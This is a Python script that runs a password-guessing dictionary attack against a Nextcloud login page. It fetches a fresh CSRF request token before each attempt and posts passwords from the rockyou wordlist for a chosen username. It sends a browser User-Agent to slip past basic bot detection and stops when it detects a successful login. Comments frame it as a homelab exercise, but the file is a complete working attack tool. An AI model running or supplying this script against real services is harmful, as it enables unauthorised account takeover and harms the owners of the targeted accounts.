import requests
from bs4 import BeautifulSoup
import sys

# --- Target Configuration 
# Replace with your actual homelab IP and Port
target_url = "http://<TARGET_IP>:<PORT>/index.php/login"
username = "<TARGET_USERNAME>"
wordlist_path = "rockyou.txt"

# Standard browser headers to avoid basic bot detection
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
}

# Initialize a persistent session to handle cookies and CSRF states
session = requests.Session()
session.headers.update(headers)

print(f"[*] Starting Dictionary Attack on: {target_url}")
print(f"[*] Target User: {username}")

try:
    # Open wordlist using latin-1 encoding to prevent crashes on special characters
    with open(wordlist_path, 'r', encoding='latin-1') as file:
        for count, line in enumerate(file, 1):
            password = line.strip() # Remove leading/trailing whitespace
            
            # PHASE 1: Dynamic CSRF Token Extraction
            # Nextcloud requires a valid 'requesttoken' for every login attempt
            response = session.get(target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            csrf_token = None
            
            # Method A: Extract from the 'data-requesttoken' attribute in the head tag
            head_tag = soup.find('head')
            if head_tag and head_tag.has_attr('data-requesttoken'):
                csrf_token = head_tag['data-requesttoken']
            
            # Method B: Fallback to searching for a hidden input field named 'requesttoken'
            if not csrf_token:
                input_tag = soup.find('input', {'name': 'requesttoken'})
                if input_tag:
                    csrf_token = input_tag.get('value')
            
            # If no token is found, the system might be blocking us or the structure changed
            if not csrf_token:
                print(f"\n[-] Critical Error: CSRF token not found at attempt {count}.")
                print("[-] Likely Cause: Security mechanism (IPS/Throttling) activated.")
                sys.exit(1)

            # PHASE 2: Crafting and Sending the Authentication Request
            payload = {
                'user': username,
                'password': password,
                'requesttoken': csrf_token
            }
            
            # Send POST request with the harvested token
            post_response = session.post(target_url, data=payload)
            
            # PHASE 3: Result Analysis
            # A successful login typically redirects (302) or contains 'Logout' in the response
            if "Log out" in post_response.text or "Logout" in post_response.text or post_response.status_code == 302:
                print(f"\n[+] SUCCESS! Password identified: {password}")
                print(f"[+] Total attempts: {count}")
                sys.exit(0)
            else:
                # Progress indicator: \r keeps the output on a single line
                print(f"\r[-] Testing password #{count}: {password[:15]:<15}", end="")
                
except FileNotFoundError:
    print(f"\n[!] Configuration Error: Wordlist '{wordlist_path}' not found.")
except KeyboardInterrupt:
    print("\n\n[!] Operation aborted by user (Ctrl+C).")
    sys.exit(0)
